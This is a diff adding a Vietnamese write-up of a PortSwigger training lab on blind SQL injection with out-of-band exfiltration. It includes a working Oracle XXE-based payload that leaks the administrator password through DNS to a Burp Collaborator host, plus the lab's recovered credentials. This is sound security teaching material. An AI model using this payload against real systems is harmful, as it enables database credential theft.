@@ -524,3 +524,29 @@ Chúng ta sẽ đổi giá trị của cookie `TrackingId` thành payload bên d
 Sau đó, có thể quan sát thấy kết quả bên tab Collaborator:
 
 ![image](images/lab-16/lab-16-1.png)
+
+## Lab 17: [Blind SQL injection with out-of-band data exfiltration](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration)
+
+> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+>
+> The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.
+>
+> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.
+>
+> To solve the lab, log in as the `administrator` user.
+
+Bài lab yêu cầu chúng ta đăng nhập vào ứng dụng với user là `administrator`.
+
+Trước tiên, để lấy được password, chúng ta có thể đổi giá trị của cookie `TrackingId` thành payload bên dưới, chú ý domain sẽ khác.
+
+```sql
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.mlb6ctchdthwxdxq1bfjzuwlvc16pwdl.oastify.com/"> %remote;]>'),'/l') FROM dual--
+```
+
+![image](images/lab-17/lab-17.png)
+
+Đợi chút sẽ thấy được password nằm ở subdomain trong tab Collaborator:
+
+![image](images/lab-17/lab-17-1.png)
+
+Vậy chúng ta giải thành công bài lab bằng cách đăng nhập với `administrator:ljnfmtsp9sb2gaugtwce`.
